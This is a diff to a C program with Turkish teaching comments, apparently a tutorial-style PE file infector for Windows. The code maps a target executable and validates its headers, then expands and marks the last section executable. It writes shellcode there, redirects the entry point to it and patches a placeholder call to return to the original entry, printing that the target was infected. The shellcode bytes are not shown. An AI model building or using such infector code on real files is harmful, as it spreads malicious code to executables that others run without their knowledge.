@@ -92,7 +92,8 @@ int main(int argc, char** argv)
 	}
 
 	printf("Dosyamizi hafizaya aliyoruz. Artik process memory alanimizda yeni bir mapping hafiza alanimiz olacak\n");
-	MappedFile = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0); // Map the target file into memory
+	MappedFile = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0); // dosyamiz artik processemizin hafiza tablosuna adreslendi. 
+																	//yani process hacker'i acip memory sekmesinde dosyamizi Mapped:Commit alanında temasa eyleyebilisiniz.
 
 	if (!MappedFile)
 	{
@@ -109,7 +110,7 @@ int main(int argc, char** argv)
 	// Dosya artik hafizada olduguna gore infection icin on denetimlere baslamanin da vakti geldi demektir. 
 	// Oncelikle Pe validationlarini gerceklestirelim ki gidip bir jpeg dosyasına infecte olmaya calismasin kodumuz değil mi? :)
 
-	// Hafiza da ki dosya byte dokumunu PIMAGE_DOS_HEADER yapısı ile ilişiklendiriyoruz yapisal erisimlerimizi pointerlar ile rahatlikla yapalim
+	// Hafiza da ki dosya byte dokumunu PIMAGE_DOS_HEADER yapısı ile ilişiklendiriyoruz ki yapisal erisimlerimizi pointerlar ile rahatlikla yapalim
 	pDosHeader = (PIMAGE_DOS_HEADER)MappedFile;
 
 	// Dosya MZ header'ina sahip mi. Unutma!! her exe,dll MZ ile başlar. inanmıyorsan hex editorle bak.
@@ -141,7 +142,7 @@ int main(int argc, char** argv)
 
 	if (pNTHeader->OptionalHeader.Subsystem != IMAGE_SUBSYSTEM_WINDOWS_GUI && pNTHeader->OptionalHeader.Subsystem != IMAGE_SUBSYSTEM_WINDOWS_CUI)
 	{
-		printf("Hata: Tamam bir exe olabilir ama asla bir PE değil!\n");
+		printf("Hata: Tamam bir exe olabilir ama asla geçerli bir PE değil!\n");
 		UnmapViewOfFile(MappedFile);
 
 		CloseHandle(hMap);
@@ -164,30 +165,30 @@ int main(int argc, char** argv)
 	OriginalEntryPoint = pNTHeader->OptionalHeader.AddressOfEntryPoint; // orjinal entrypoint'i sakliyalim lazım olacak
 	printf("Mevcut entry point: %#x\n", OriginalEntryPoint);
 
-	FirstSection = (PIMAGE_SECTION_HEADER)(pNTHeader + 1); // Get the first section
-	LastSection = &FirstSection[pNTHeader->FileHeader.NumberOfSections - 1]; // Get the last section
+	FirstSection = (PIMAGE_SECTION_HEADER)(pNTHeader + 1); // İlk section adresini alıyoruz
+	LastSection = &FirstSection[pNTHeader->FileHeader.NumberOfSections - 1]; // ve tabiki de sonuncusunuda 
 
-	Offset = LastSection->PointerToRawData + LastSection->SizeOfRawData; // Offset to the new space in the expanded section
-	printf("Offset to new space: %#x\n", Offset);
+	Offset = LastSection->PointerToRawData + LastSection->SizeOfRawData; // Enfekte edeceğimiz shellcode icin biraz alan lazim, mevcutlari bilelim ki gecekonduyu nereye dikecegiz bilelim ;)
+	printf("Arsamizin offseti: %#x\n", Offset);
 
-	LastSection->Misc.VirtualSize = Align(LastSection->Misc.VirtualSize + ExpandSize, pNTHeader->OptionalHeader.SectionAlignment); // Update the virtual size
-	LastSection->SizeOfRawData = Align(LastSection->SizeOfRawData + ExpandSize, pNTHeader->OptionalHeader.FileAlignment); // Update the raw size
-	LastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE; // Mark the section as executable
+	LastSection->Misc.VirtualSize = Align(LastSection->Misc.VirtualSize + ExpandSize, pNTHeader->OptionalHeader.SectionAlignment); // Mevcut section'i shellcode umuzun boyutu kadar genisletiyoruz ki maraz cikmasin
+	LastSection->SizeOfRawData = Align(LastSection->SizeOfRawData + ExpandSize, pNTHeader->OptionalHeader.FileAlignment); // Genislettik ama parserlara boyut bilgisi de lazim. Bu yuzden SizeOfRawData yi da guncelliyoruz.
+	LastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE; // Ve tabiki bu kod calissin istiyorsak , section ı Executable olarak isaretliyoruz.
 
-	NewFileSize = LastSection->PointerToRawData + LastSection->SizeOfRawData; // The new file size must be at least the sum of the file address and raw size, or the the PE image will fail to load
+	NewFileSize = LastSection->PointerToRawData + LastSection->SizeOfRawData; // O kadar oynadik mincikladik bunun bir yansimasi olmali degil mi? Simdi az once guncelledihimiz section bilgilerini gercek dosya uzerinde gosterme zamani, aksi takdirde Pe loader gummmm.
 	NewEntryPoint = FileAddressToVirtualAddress(MappedFile, Offset);
 
-	printf("New file size: %d bytes\nNew entry point: %#x\n", NewFileSize, NewEntryPoint);
+	printf("Yeni olusacak dosyanin boyutu: %d bytes\nYeni entry point: %#x\n", NewFileSize, NewEntryPoint);
 
-	pNTHeader->OptionalHeader.AddressOfEntryPoint = NewEntryPoint; // Calculate the new entry point
-	pNTHeader->OptionalHeader.SizeOfImage = Align(LastSection->VirtualAddress + LastSection->Misc.VirtualSize, pNTHeader->OptionalHeader.SectionAlignment); // Update the image size
+	pNTHeader->OptionalHeader.AddressOfEntryPoint = NewEntryPoint; // Yeni entry point'i eskisinin uzerine yaz
+	pNTHeader->OptionalHeader.SizeOfImage = Align(LastSection->VirtualAddress + LastSection->Misc.VirtualSize, pNTHeader->OptionalHeader.SectionAlignment); // Ayni sekilde boyutu da yaz
 
-	printf("Unmapping the target file\n");
+	printf("Dosya ile isimiz bitti , actigimiz hafiza ve dosya handle larini kapatiyoruz\n");
 
 	UnmapViewOfFile(MappedFile);
 	CloseHandle(hMap);
 
-	printf("Creating the file mapping object with new file size\n");
+	printf("Yeni dosya boyutu ile File Mapping nesnesini olusturuyoruz\n");
 	hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, NewFileSize, NULL);
 
 	if (!hMap)
@@ -198,7 +199,7 @@ int main(int argc, char** argv)
 		return 0;
 	}
 
-	printf("Mapping the target file into memory\n");
+	printf("Hafizaya aliyoruz\n");
 	MappedFile = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
 
 	if (!MappedFile)
@@ -211,30 +212,32 @@ int main(int argc, char** argv)
 		return 0;
 	}
 
-	printf("File mapped at %#x\n", MappedFile);
+	printf("Yeni dosyamizin maplendigi adres %#x\n", MappedFile);
 
 	// Write the shellcode to the new space in the expanded section
 
-	printf("Writing shellcode into target file\n");
+	printf("Hazirladigimiz yeni dosyaya shellcode yaziliyor\n");
 
 	Buffer = (PUCHAR)MappedFile + Offset;
 	memcpy(Buffer, Shellcode, sizeof(Shellcode));
 
 	ptr = (PUCHAR)Buffer;
 
-	// Find the dummy call in the shellcode and replace it with the real call to the original entry point
+	// Shellcode muz muneccim degil ki, orjinal dosyanin giris noktasini bilsin ve kendi isini bitirdikten sonra is akisini tekrar orjinal akisa devretsin! Degilmi ama?
+	// Bu yuzdendir ki shellcode umuzun 0xe8 yani CALL adlı opcode offsetini ve kolayca bulalim diye yanina ilistirdigimiz 0x12345678 cakma adresini 
+	// bulup oraya orjinal adrese gidecegi degeri yaziyoruz ;)
 
 	for (i = 0; i<sizeof(Shellcode); i++)
 	{
 		if (ptr[i] == 0xe8 && *(PULONG)&ptr[i + 1] == 0x12345678)
 		{
-			// Call offset = Target address - Current address - 5
+			// Call opcode un ofseti = Hedef adres - Mevcut Adres - 5
 
 			*(PULONG)&ptr[i + 1] = OriginalEntryPoint - FileAddressToVirtualAddress(MappedFile, (ULONG)&ptr[i] - (ULONG)MappedFile) - 5;
 		}
 	}
 
-	printf("Target file successfully infected!\n");
+	printf("Hedef dosya basari ile enfekte edildi!\n");
 	UnmapViewOfFile(MappedFile);
 
 	CloseHandle(hMap);
